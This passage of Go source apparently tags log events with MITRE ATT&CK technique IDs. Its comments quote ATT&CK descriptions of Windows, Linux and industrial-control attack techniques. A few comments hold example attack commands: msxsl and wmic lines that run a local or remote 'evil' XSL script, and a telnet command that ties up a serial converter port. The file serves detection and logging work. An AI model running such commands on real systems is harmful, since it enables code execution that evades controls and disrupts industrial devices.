Adversaries may abuse the Windows command shell for execution. The Windows
command shell (cmd) is the primary command prompt on Windows systems. The
Windows command prompt can be used to control almost any aspect of a system,
with various permission levels required for different subsets of commands.
Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential
commands to run, as well as normal scripting operations such as conditionals and
loops. Common uses of batch files include long or repetitive tasks, or the need
to run the same set of commands on multiple systems. Adversaries may leverage
cmd to execute various commands and payloads. Common uses include cmd to execute
a single command, or abusing cmd interactively with input and output forwarded
over a command and control channel.
*/
func (g *Session) ATTACKEntWindowsCommandShell(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.003").
        Msg("windows command shell")
}

/* ATTACKEntWindowsCredentialManager Phases: credential-access

Adversaries may acquire credentials from the Windows Credential Manager. The
Credential Manager stores credentials for signing into websites, applications,
and/or devices that request authentication through NTLM or Kerberos in
Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft
Credential Manager store)(Citation: Microsoft Credential Locker) The Windows
Credential Manager separates website credentials from application or network
credentials in two lockers. As part of Credentials from Web Browsers, Internet
Explorer and Microsoft Edge website credentials are managed by the Credential
Manager and are stored in the Web Credentials locker. Application and network
credentials are stored in the Windows Credentials locker. Credential Lockers
store credentials in encrypted .vcrd files, located under
%Systemdrive%\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\. The
encryption key can be found in a file named Policy.vpol, typically located in
the same folder as the credentials.(Citation: passcape Windows Vault)(Citation:
Malwarebytes The Windows Vault) Adversaries may list credentials managed by the
Windows Credential Manager through several mechanisms. vaultcmd.exe is a native
Windows executable that can be used to enumerate credentials stored in the
Credential Locker through a command-line interface. Adversaries may gather
credentials by reading files located inside of the Credential Lockers.
Adversaries may also abuse Windows APIs such as CredEnumerateA to list
credentials managed by the Credential Manager.(Citation: Microsoft
CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager) Adversaries may use
password recovery tools to obtain plain text passwords from the Credential
Manager.(Citation: Malwarebytes The Windows Vault)
*/
func (g *Session) ATTACKEntWindowsCredentialManager(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1555.004").
        Msg("windows credential manager")
}

/* ATTACKEntWindowsFileandDirectoryPermissionsModification Phases: defense-evasion

Adversaries may modify file or directory permissions/attributes to evade access
control lists (ACLs) and access protected files.(Citation: Hybrid Analysis
Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and
directory permissions are commonly managed by ACLs configured by the file or
directory owner, or users with the appropriate permissions. File and directory
ACL implementations vary by platform, but generally explicitly designate which
users or groups can perform which actions (read, write, execute, etc.). Windows
implements file and directory ACLs as Discretionary Access Control Lists
(DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs
identifies the accounts that are allowed or denied access to a securable object.
When an attempt is made to access a securable object, the system checks the
access control entries in the DACL in order. If a matching entry is found,
access to the object is granted. Otherwise, access is denied.(Citation:
Microsoft Access Control Lists May 2018) Adversaries can interact with the DACLs
using built-in Windows commands, such as icacls, cacls, takeown, and attrib,
which can grant adversaries higher permissions on specific files and folders.
Further, PowerShell provides cmdlets that can be used to retrieve or modify file
and directory DACLs. Specific file and directory modifications may be a required
step for many techniques, such as establishing Persistence via Accessibility
Features, Boot or Logon Initialization Scripts, or tainting/hijacking other
instrumental binary/configuration files via Hijack Execution Flow.
*/
func (g *Session) ATTACKEntWindowsFileandDirectoryPermissionsModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1222.001").
        Msg("windows file and directory permissions modification")
}

/* ATTACKEntWindowsManagementInstrumentation Phases: execution

Adversaries may abuse Windows Management Instrumentation (WMI) to achieve
execution. WMI is a Windows administration feature that provides a uniform
environment for local and remote access to Windows system components. It relies
on the WMI service for local and remote access and the server message block
(SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS)
(Citation: TechNet RPC) for remote access. RPCS operates over port 135.
(Citation: MSDN WMI) An adversary can use WMI to interact with local and remote
systems and use it as a means to perform many tactic functions, such as
gathering information for Discovery and remote Execution of files as part of
Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)
*/
func (g *Session) ATTACKEntWindowsManagementInstrumentation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1047").
        Msg("windows management instrumentation")
}

/* ATTACKEntWindowsManagementInstrumentationEventSubscription Phases: privilege-escalation persistence

Adversaries may establish persistence and elevate privileges by executing
malicious content triggered by a Windows Management Instrumentation (WMI) event
subscription. WMI can be used to install event filters, providers, consumers,
and bindings that execute code when a defined event occurs. Examples of events
that may be subscribed to are the wall clock time, user loging, or the
computer's uptime. (Citation: Mandiant M-Trends 2015) Adversaries may use the
capabilities of WMI to subscribe to an event and execute arbitrary code when
that event occurs, providing persistence on a system. (Citation: FireEye WMI
SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts
into Windows Management Object (MOF) files (.mof extension) that can be used to
create a malicious subscription. (Citation: Dell WMI Persistence) (Citation:
Microsoft MOF May 2018) WMI subscription execution is proxied by the WMI
Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM
privileges.
*/
func (g *Session) ATTACKEntWindowsManagementInstrumentationEventSubscription(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.003").
        Msg("windows management instrumentation event subscription")
}

/* ATTACKEntWindowsRemoteManagement Phases: lateral-movement

Adversaries may use Valid Accounts to interact with remote systems using Windows
Remote Management (WinRM). The adversary may then perform actions as the logged-
on user. WinRM is the name of both a Windows service and a protocol that allows
a user to interact with a remote system (e.g., run an executable, modify the
Registry, modify services).(Citation: Microsoft WinRM) It may be called with the
winrm command or by any number of programs such as PowerShell.(Citation:
Jacobsen 2014)
*/
func (g *Session) ATTACKEntWindowsRemoteManagement(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1021.006").
        Msg("windows remote management")
}

/* ATTACKEntWindowsService Phases: persistence privilege-escalation

Adversaries may create or modify Windows services to repeatedly execute
malicious payloads as part of persistence. When Windows boots up, it starts
programs or applications called services that perform background system
functions.(Citation: TechNet Services) Windows service configuration
information, including the file path to the service's executable or recovery
programs/commands, is stored in the Windows Registry. Service configurations can
be modified using utilities such as sc.exe and Reg.  Adversaries may install a
new service or modify an existing service by using system utilities to interact
with services, by directly modifying the Registry, or by using custom tools to
interact with the Windows API. Adversaries may configure services to execute at
startup in order to persist on a system. An adversary may also incorporate
Masquerading by using a service name from a related operating system or benign
software, or by modifying existing services to make detection analysis more
challenging. Modifying existing services may interrupt their functionality or
may enable services that are disabled or otherwise not commonly used.  Services
may be created with administrator privileges but are executed under SYSTEM
privileges, so an adversary may also use a service to escalate privileges from
administrator to SYSTEM. Adversaries may also directly start services through
Service Execution.
*/
func (g *Session) ATTACKEntWindowsService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1543.003").
        Msg("windows service")
}

/* ATTACKEntWinlogonHelperDLL Phases: persistence privilege-escalation

Adversaries may abuse features of Winlogon to execute DLLs and/or executables
when a user logs in. Winlogon.exe is a Windows component responsible for actions
at logon/logoff as well as the secure attention sequence (SAS) triggered by
Ctrl-Alt-Delete. Registry entries in
HKLM\Software[\Wow6432Node\]\Microsoft\Windows NT\CurrentVersion\Winlogon\ and
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage
additional helper programs and functionalities that support Winlogon. (Citation:
Cylance Reg Persistence Sept 2013)  Malicious modifications to these Registry
keys may cause Winlogon to load and execute malicious DLLs and/or executables.
Specifically, the following subkeys have been known to be possibly vulnerable to
abuse: (Citation: Cylance Reg Persistence Sept 2013)  Winlogon\Notify - points
to notification package DLLs that handle Winlogon events Winlogon\Userinit -
points to userinit.exe, the user initialization program executed when a user
logs on Winlogon\Shell - points to explorer.exe, the system shell executed when
a user logs on  Adversaries may take advantage of these features to repeatedly
execute malicious code and establish persistence.
*/
func (g *Session) ATTACKEntWinlogonHelperDLL(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.004").
        Msg("winlogon helper dll")
}

/* ATTACKEntXDGAutostartEntries Phases: persistence privilege-escalation

Adversaries may modify XDG autostart entries to execute programs or commands
during system boot. Linux desktop environments that are XDG compliant implement
functionality for XDG autostart entries. These entries will allow an application
to automatically start during the startup of a desktop environment after user
logon. By default, XDG autostart entries are stored within the
/etc/xdg/autostart or ~/.config/autostart directories and have a .desktop file
extension.(Citation: Free Desktop Application Autostart Feb 2006) Within an XDG
autostart entry file, the Type key specifies if the entry is an application
(type 1), link (type 2) or directory (type 3). The Name key indicates an
arbitrary name assigned by the creator and the Exec key indicates the
application and command line arguments to execute.(Citation: Free Desktop Entry
Keys) Adversaries may use XDG autostart entries to maintain persistence by
executing malicious commands and payloads, such as remote access tools, during
the startup of a desktop environment. Commands included in XDG autostart entries
with execute after user logon in the context of the currently logged on user.
Adversaries may also use Masquerading to make XDG autostart entries look as if
they are associated with legitimate programs.
*/
func (g *Session) ATTACKEntXDGAutostartEntries(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.013").
        Msg("xdg autostart entries")
}

/* ATTACKEntXSLScriptProcessing Phases: defense-evasion

Adversaries may bypass application control and obscure execution of code by
embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files
are commonly used to describe the processing and rendering of data within XML
files. To support complex operations, the XSL standard includes support for
embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar
2017) Adversaries may abuse this functionality to execute arbitrary files while
potentially bypassing application control. Similar to Trusted Developer
Utilities Proxy Execution, the Microsoft common line transformation utility
binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to
execute malicious JavaScript embedded within local or remote (URL referenced)
XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe
is not installed by default, an adversary will likely need to package it with
dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes
two main arguments, an XML source file and an XSL stylesheet. Since the XSL file
is valid XML, the adversary may call the same XSL file twice. When using
msxsl.exe adversaries may also give the XML/XSL files an arbitrary file
extension.(Citation: XSL Bypass Mar 2019) Command-line examples:(Citation:
Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)
msxsl.exe customers[.]xml script[.]xsl msxsl.exe script[.]xsl script[.]xsl
msxsl.exe script[.]jpeg script[.]jpeg  Another variation of this technique,
dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke
JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique
can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo"
counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse
any alias in Windows Management Instrumentation provided they utilize the
/FORMAT switch.(Citation: XSL Bypass Mar 2019) Command-line examples:(Citation:
XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)  Local File: wmic process list
/FORMAT:evil[.]xsl Remote File: wmic os get
/FORMAT:”https[:]//example[.]com/evil[.]xsl”
*/
func (g *Session) ATTACKEntXSLScriptProcessing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1220").
        Msg("xsl script processing")
}

/* ATTACKICSActivateFirmwareUpdateMode Phases: inhibit-response-function

Adversaries may activate firmware update mode on devices to prevent expected
response functions from engaging in reaction to an emergency or process
malfunction. For example, devices such as protection relays may have an
operation mode designed for firmware installation. This mode may halt process
monitoring and related functions to allow new firmware to be loaded. A device
left in update mode may be placed in an inactive holding state if no firmware is
provided to it. By entering and leaving a device in this mode, the adversary may
deny its usual functionalities.
*/
func (g *Session) ATTACKICSActivateFirmwareUpdateMode(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0800").
        Msg("activate firmware update mode")
}

/* ATTACKICSAlarmSuppression Phases: inhibit-response-function

Adversaries may target protection function alarms to prevent them from notifying
operators of critical conditions. Alarm messages may be a part of an overall
reporting system and of particular interest for adversaries. Disruption of the
alarm system does not imply the disruption of the reporting system as a whole.
In the Maroochy Attack, the adversary suppressed alarm reporting to the central
computer. (Citation: Maroochy - MITRE - 200808) A Secura presentation on
targeting OT notes a dual fold goal for adversaries attempting alarm
suppression: prevent outgoing alarms from being raised and prevent incoming
alarms from being responded to. (Citation: References - Secura - 2019) The
method of suppression may greatly depend on the type of alarm in question:  An
alarm raised by a protocol message An alarm signaled with I/O An alarm bit set
in a flag (and read)  In ICS environments, the adversary may have to suppress or
contend with multiple alarms and/or alarm propagation to achieve a specific goal
to evade detection or prevent intended responses from occurring. (Citation:
References - Secura - 2019) Methods of suppression may involve tampering or
altering device displays and logs, modifying in memory code to fixed values, or
even tampering with assembly level instruction code.
*/
func (g *Session) ATTACKICSAlarmSuppression(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0878").
        Msg("alarm suppression")
}

/* ATTACKICSAutomatedCollection Phases: collection-ics

Adversaries may automate collection of industrial environment information using
tools or scripts. This automated collection may leverage native control
protocols and tools available in the control systems environment. For example,
the OPC protocol may be used to enumerate and gather information. Access to a
system or interface with these native protocols may allow collection and
enumeration of other attached, communicating servers and devices.
*/
func (g *Session) ATTACKICSAutomatedCollection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0802").
        Msg("automated collection")
}

/* ATTACKICSBlockCommandMessage Phases: inhibit-response-function

Adversaries may block a command message from reaching its intended target to
prevent command execution. In OT networks, command messages are sent to provide
instructions to control system devices. A blocked command message can inhibit
response functions from correcting a disruption or unsafe condition.(Citation:
Research - Research - Taxonomy Cyber Attacks on SCADA)(Citation: Ukraine15 -
EISAC - 201603)
*/
func (g *Session) ATTACKICSBlockCommandMessage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0803").
        Msg("block command message")
}

/* ATTACKICSBlockReportingMessage Phases: inhibit-response-function

Adversaries may block or prevent a reporting message from reaching its intended
target. In control systems, reporting messages contain telemetry data (e.g., I/O
values) pertaining to the current state of equipment and the industrial process.
By blocking these reporting messages, an adversary can potentially hide their
actions from an operator. Blocking reporting messages in control systems that
manage physical processes may contribute to system impact, causing inhibition of
a response function. A control system may not be able to respond in a proper or
timely manner to an event, such as a dangerous fault, if its corresponding
reporting message is blocked.(Citation: Research - Research - Taxonomy Cyber
Attacks on SCADA)(Citation: Ukraine15 - EISAC - 201603)
*/
func (g *Session) ATTACKICSBlockReportingMessage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0804").
        Msg("block reporting message")
}

/* ATTACKICSBlockSerialCOM Phases: inhibit-response-function

Adversaries may block access to serial COM to prevent instructions or
configurations from reaching target devices. Serial Communication ports (COM)
allow communication with control system devices. Devices can receive command and
configuration messages over such serial COM. Devices also use serial COM to send
command and reporting messages. Blocking device serial COM may also block
command messages and block reporting messages.  A serial to Ethernet converter
is often connected to a serial COM to facilitate communication between serial
and Ethernet devices. One approach to blocking a serial COM would be to create
and hold open a TCP session with the Ethernet side of the converter. A serial to
Ethernet converter may have a few ports open to facilitate multiple
communications. For example, if there are three serial COM available -- 1, 2 and
3 --, the converter might be listening on the corresponding ports 20001, 20002,
and 20003. If a TCP/IP connection is opened with one of these ports and held
open, then the port will be unavailable for use by another party. One way the
adversary could achieve this would be to initiate a TCP session with the serial
to Ethernet converter at 10.0.0.1 via Telnet on serial port 1 with the following
command: telnet 10.0.0.1 20001.
*/
func (g *Session) ATTACKICSBlockSerialCOM(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0805").
        Msg("block serial com")
}

/* ATTACKICSBruteForceIO Phases: impair-process-control

Adversaries may brute force I/O addresses on a device and attempt to
exhaustively perform an action. By enumerating the full range of I/O addresses,
an adversary may manipulate a process function without having to target specific
I/O interfaces. More than one process function manipulation and enumeration pass
may occur on the targeted I/O range in a brute force attempt.
*/
func (g *Session) ATTACKICSBruteForceIO(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0806").
        Msg("brute force i/o")
}

/* ATTACKICSChangeProgramState Phases: execution-ics impair-process-control

Adversaries may attempt to change the state of the current program on a control
device. Program state changes may be used to allow for another program to take
over control or be loaded onto the device.
*/
func (g *Session) ATTACKICSChangeProgramState(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0875").
        Msg("change program state")
}

/* ATTACKICSChangeOperatingMode Phases: execution-ics evasion-ics

Adversaries Adversaries may change the operating mode of a controller to gain
additional access to engineering functions such as Program Download.
Programmable controllers typically have several modes of operation that control
the state of the user program and control access to the controller’s API.
Operating modes can be physically selected using a key switch on the face of the
controller but may also be selected with calls to the controller’s API.
Operating modes and the mechanisms by which they are selected often vary by
vendor and product line. Some commonly implemented operating modes are described
below: Program - This mode must be enabled before changes can be made to a
device’s program. This allows program uploads and downloads between the device
and an engineering workstation. Often the PLC’s logic Is halted, and all outputs
may be forced off.(Citation: Forum Automation PLC Operating Modes October 2017)
Run - Execution of the device’s program occurs in this mode. Input and output
(values, points, tags, elements, etc.) are monitored and used according to the
program’s logic. Program Upload and Program Download are disabled while in this
mode.(Citation: Omrom PLC Different Operating Modes)(Citation: Machine
Information Systems How PLCs Work 2007)(Citation: Forum Automation PLC Operating
Modes October 2017)(Citation: PLCgurus PLC Basics 2021) Remote - Allows for
remote changes to a PLC’s operation mode.(Citation: PLCgurus PLC Basics 2021)
Stop - The PLC and program is stopped, while in this mode, outputs are forced
off.(Citation: Machine Information Systems How PLCs Work 2007) Reset -
Conditions on the PLC are reset to their original states. Warm resets may retain
some memory while cold resets will reset all I/O and data registers.(Citation:
Machine Information Systems How PLCs Work 2007)Test / Monitor mode - Similar to
run mode, I/O is processed, although this mode allows for monitoring, force set,
resets, and more generally tuning or debugging of the system. Often monitor mode
may be used as a trial for initialization.(Citation: Omrom PLC Different
Operating Modes)
*/
func (g *Session) ATTACKICSChangeOperatingMode(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0858").
        Msg("change operating mode")
}

/* ATTACKICSCommandLineInterface Phases: execution-ics

Adversaries may utilize command-line interfaces (CLIs) to interact with systems
and execute commands. CLIs provide a means of interacting with computer systems
and are a common feature across many types of platforms and devices within
control systems environments. (Citation: EAttack Command-Line Interface)
Adversaries may also use CLIs to install and run new software, including
malicious tools that may be installed over the course of an operation. CLIs are
typically accessed locally, but can also be exposed via services, such as SSH,
Telnet, and RDP.  Commands that are executed in the CLI execute with the current
permissions level of the process running the terminal emulator, unless the
command specifies a change in permissions context. Many controllers have CLI
interfaces for management purposes. Detection: Command-line interface activities
can be captured through proper logging of process execution with command-line
arguments. This information can be useful in gaining additional insight to
adversaries' actions through how they use native processes or custom tools.
*/
func (g *Session) ATTACKICSCommandLineInterface(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0807").
        Msg("command-line interface")
}

/* ATTACKICSCommonlyUsedPort Phases: command-and-control-ics

Adversaries may communicate over a commonly used port to bypass firewalls or
network detection systems and to blend in with normal network activity, to avoid
more detailed inspection. They may use the protocol associated with the port, or
a completely different protocol. They may use commonly open ports, such as the
examples provided below. * TCP:80 (HTTP) * TCP:443 (HTTPS) * TCP/UDP:53 (DNS) *
TCP:1024-4999 (OPC on XP/Win2k3) * TCP:49152-65535 (OPC on Vista and later) *
TCP:23 (TELNET) * UDP:161 (SNMP) * TCP:502 (MODBUS) * TCP:102 (S7comm/ISO-TSAP)
* TCP:20000 (DNP3) * TCP:44818 (Ethernet/IP) Contributors: Matan Dobrushin -
Otorio
*/
func (g *Session) ATTACKICSCommonlyUsedPort(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0885").
        Msg("commonly used port")
}

/* ATTACKICSConnectionProxy Phases: command-and-control-ics

Adversaries may use a connection proxy to direct network traffic between systems
or act as an intermediary for network communications. The definition of a proxy
can also be expanded to encompass trust relationships between networks in peer-
to-peer, mesh, or trusted connections between networks consisting of hosts or
systems that regularly communicate with each other. The network may be within a
single organization or across multiple organizations with trust relationships.
Adversaries could use these types of relationships to manage command and control
communications, to reduce the number of simultaneous outbound network
connections, to provide resiliency in the face of connection loss, or to ride
over existing trusted communications paths between victims to avoid suspicion.
(Citation: EAttack Connection Proxy) Detection: Processes utilizing the network
that do not normally have network communication or have never been seen before
are suspicious. Network activities disassociated from user-driven actions from
processes that normally require user direction are suspicious. Analyze network
data for uncommon data flows (e.g., a client sending significantly more data
than it receives from a server or between clients that should not or often do
not communicate with one another). Processes utilizing the network that do not
normally have network communication or have never been seen before are
suspicious. Analyze packet contents to detect communications that do not follow
the expected protocol behavior for the port that is being used. (Citation:
University of Birmingham C2)
*/
func (g *Session) ATTACKICSConnectionProxy(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0884").
        Msg("connection proxy")
}

/* ATTACKICSControlDeviceIdentification Phases: discovery-ics

Adversaries may perform control device identification to determine the make and
model of a target device. Management software and device APIs may be utilized by
the adversary to gain this information. By identifying and obtaining device
specifics, the adversary may be able to determine device vulnerabilities. This
device information can also be used to understand device functionality and
inform the decision to target the environment.
*/
func (g *Session) ATTACKICSControlDeviceIdentification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0808").
        Msg("control device identification")
}

/* ATTACKICSDamagetoProperty Phases: impact-ics

Adversaries may cause damage and destruction of property to infrastructure,
equipment, and the surrounding environment when attacking control systems. This
technique may result in device and operational equipment breakdown, or represent
tangential damage from other techniques used in an attack. Depending on the
severity of physical damage and disruption caused to control processes and
systems, this technique may result in Loss of Safety. Operations that result in
Loss of Control may also cause damage to property, which may be directly or
indirectly motivated by an adversary seeking to cause impact in the form of Loss
of Productivity and Revenue.  The German Federal Office for Information Security
(BSI) reported a targeted attack on a steel mill under an incidents affecting
business section of its 2014 IT Security Report. (Citation: German Steel Mill -
German Federal Office for Information Security - 2014) These targeted attacks
affected industrial operations and resulted in breakdowns of control system
components and even entire installations. As a result of these breakdowns,
massive impact and damage resulted from the uncontrolled shutdown of a blast
furnace. In the Maroochy Attack, Vitek Boden gained remote computer access to
the control system and altered data so that whatever function should have
occurred at affected pumping stations did not occur or occurred in a different
way. This ultimately led to 800,000 liters of raw sewage being spilled out into
the community. The raw sewage affected local parks, rivers, and even a local
hotel. This resulted in harm to marine life and produced a sickening stench from
the community's now blackened rivers. (Citation: Maroochy - MITRE - 200808) A
Polish student used a remote controller device to interface with the Lodz city
tram system in Poland. (Citation: LodzTram-LondonReconnections-2017-12)
(Citation: LodzTram-InHomelandSecurity-2008-02) (Citation: LodzTram-
Schneier-2008-01) Using this remote, the student was able to capture and replay
legitimate tram signals. This resulted in damage to impacted trams, people, and
the surrounding property. Reportedly, four trams were derailed and were forced
to make emergency stops. (Citation: LodzTram-InHomelandSecurity-2008-02)
Commands issued by the student may have also resulted in tram collisions,
causing harm to those on board and the environment outside. (Citation: LodzTram-
Schneier-2008-01)
*/
func (g *Session) ATTACKICSDamagetoProperty(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0879").
        Msg("damage to property")
}

/* ATTACKICSDataDestruction Phases: inhibit-response-function

Adversaries may perform data destruction over the course of an operation. The
adversary may drop or create malware, tools, or other non-native files on a
target system to accomplish this, potentially leaving behind traces of malicious
activities. Such non-native files and other data may be removed over the course
of an intrusion to maintain a small footprint or as a standard part of the post-
intrusion cleanup process. (Citation: EAttack File Deletion)  Data destruction
may also be used to render operator interfaces unable to respond and to disrupt
response functions from occurring as expected. An adversary may also destroy
data backups that are vital to recovery after an incident. Standard file
deletion commands are available on most operating system and device interfaces
to perform cleanup, but adversaries may use other tools as well. Two examples
are Windows Sysinternals SDelete and Active@ Killdisk. Detection: It may be
uncommon for events related to benign command-line functions such as DEL or
third-party utilities or tools to be found in an environment, depending on the
user base and how systems are typically used. Monitoring for command-line
deletion functions to correlate with binaries or other files that an adversary
may drop and remove may lead to detection of malicious activity. Another good
practice is monitoring for known deletion and secure deletion tools that are not
already on systems within an enterprise network that an adversary could
introduce. Some monitoring tools may collect command-line arguments, but may not
capture DEL commands since DEL is a native function within cmd.exe.
*/
func (g *Session) ATTACKICSDataDestruction(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0809").
        Msg("data destruction")
}

/* ATTACKICSDataHistorianCompromise Phases: initial-access-ics

Adversaries may compromise and gain control of a data historian to gain a
foothold into the control system environment. Access to a data historian may be
used to learn stored database archival and analysis information on the control
system. A dual-homed data historian may provide adversaries an interface from
the IT environment to the OT environment.  Dragos has released an updated
analysis on CrashOverride that outlines the attack from the ICS network breach
to payload delivery and execution.  (Citation: Industroyer - Dragos - 201810)
The report summarized that CrashOverride represents a new application of
malware, but relied on standard intrusion techniques. In particular, new
artifacts include references to a Microsoft Windows Server 2003 host, with a SQL
Server. Within the ICS environment, such a database server can act as a data
historian. Dragos noted a device with this role should be "expected to have
extensive connections" within the ICS environment. Adversary activity leveraged
database capabilities to perform reconnaissance, including directory queries and
network connectivity checks. Permissions Required: Administrator Contributors:
Joe Slowik - Dragos
*/
func (g *Session) ATTACKICSDataHistorianCompromise(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0810").
        Msg("data historian compromise")
}

/* ATTACKICSDatafromInformationRepositories Phases: collection-ics

Adversaries may target and collect data from information repositories. This can
include sensitive data such as specifications, schematics, or diagrams of
control system layouts, devices, and processes. Examples of information
repositories include reference databases or local machines in the process
environment, as well as workstations and databases in the corporate network that
might contain information about the ICS. Information collected from these
systems may provide the adversary with a better understanding of the operational
environment, vendors used, processes, or procedures of the ICS.
*/
func (g *Session) ATTACKICSDatafromInformationRepositories(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0811").
        Msg("data from information repositories")
}

/* ATTACKICSDefaultCredentials Phases: lateral-movement-ics

Adversaries may leverage manufacturer or supplier set default credentials on
control system devices. These default credentials may have administrative
permissions and may be necessary for initial configuration of the device. It is
general best practice to change the passwords for these accounts as soon as
possible, but some manufacturers may have devices that have passwords or
usernames that cannot be changed. (Citation: Guidance - NIST SP800-82) Default
credentials are normally documented in an instruction manual that is either
packaged with the device, published online through official means, or published
online through unofficial means. Adversaries may leverage default credentials
that have not been properly modified or disabled.
*/
func (g *Session) ATTACKICSDefaultCredentials(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0812").
        Msg("default credentials")
}

/* ATTACKICSDenialofControl Phases: impact-ics

Adversaries may cause a denial of control to temporarily prevent operators and
engineers from interacting with process controls. An adversary may attempt to
deny process control access to cause a temporary loss of communication with the
control device or to prevent operator adjustment of process controls. An
affected process may still be operating during the period of control loss, but
not necessarily in a desired state. (Citation: Reference - Corero) (Citation:
Reference - SANS - 201510) (Citation: Reference - RIoT) In the Maroochy attack,
the adversary was able to temporarily shut an investigator out of the network
preventing them from issuing any controls. In the 2017 Dallas Siren incident
operators were unable to disable the false alarms from the Office of Emergency
Management headquarters.
*/
func (g *Session) ATTACKICSDenialofControl(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0813").
        Msg("denial of control")
}

/* ATTACKICSDenialofService Phases: inhibit-response-function

Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected
device functionality. Examples of DoS attacks include overwhelming the target
device with a high volume of requests in a short time period and sending the
target device a request it does not know how to handle. Disrupting device state
may temporarily render it unresponsive, possibly lasting until a reboot can
occur. When placed in this state, devices may be unable to send and receive
requests, and may not perform expected response functions in reaction to other
events in the environment. Some ICS devices are particularly sensitive to DoS
events, and may become unresponsive in reaction to even a simple ping sweep.
Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS)
against certain devices, such as in the case of the BrickerBot malware.
(Citation: BrickerBot - ICS-CERT - Alert) Adversaries may exploit a software
vulnerability to cause a denial of service by taking advantage of a programming
error in a program, service, or within the operating system software or kernel
itself to execute adversary-controlled code. Vulnerabilities may exist in
software that can be used to cause a  or denial of service condition.
Adversaries may have prior knowledge about industrial protocols or control
devices used in the environment through Control Device Identification. There are
examples of adversaries remotely causing a Device Restart/Shutdown by exploiting
a vulnerability that induces uncontrolled resource consumption. (Citation:
Industroyer - ICS-CERT ADV) (Citation: Industroyer - CWE-400) (Citation:
Industroyer - CVE-2015-5374) In the Maroochy attack, the adversary was able to
shut an investigator out of the network. (Citation: Maroochy - MITRE - 200808)
*/
func (g *Session) ATTACKICSDenialofService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0814").
        Msg("denial of service")
}

/* ATTACKICSDenialofView Phases: impact-ics

Adversaries may cause a denial of view in attempt to disrupt and prevent
operator oversight on the status of an ICS environment. This may manifest itself
as a temporary communication failure between a device and its control source,
where the interface recovers and becomes available once the interference ceases.
(Citation: Reference - Corero) (Citation: Reference - SANS - 201510) (Citation:
Reference - RIoT)  An adversary may attempt to deny operator visibility by
preventing them from receiving status and reporting messages. Denying this view
may temporarily block and prevent operators from noticing a change in state or
anomalous behavior. The environment's data and processes may still be
operational, but functioning in an unintended or adversarial manner. In the
Maroochy attack, the adversary was able to temporarily shut an investigator out
of the network, preventing them from viewing the state of the system.
*/
func (g *Session) ATTACKICSDenialofView(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0815").
        Msg("denial of view")
}

/* ATTACKICSDetectOperatingMode Phases: collection-ics

Adversaries may gather information about a PLC’s or controller’s current
operating mode. Operating modes dictate what change or maintenance functions can
be manipulated and are often controlled by a key switch on the PLC (e.g., run,
prog [program], and remote). Knowledge of these states may be valuable to an
adversary to determine if they are able to reprogram the PLC. Operating modes
and the mechanisms by which they are selected often vary by vendor and product
line. Some commonly implemented operating modes are described below: Program -
This mode must be enabled before changes can be made to a device’s program. This
allows program uploads and downloads between the device and an engineering
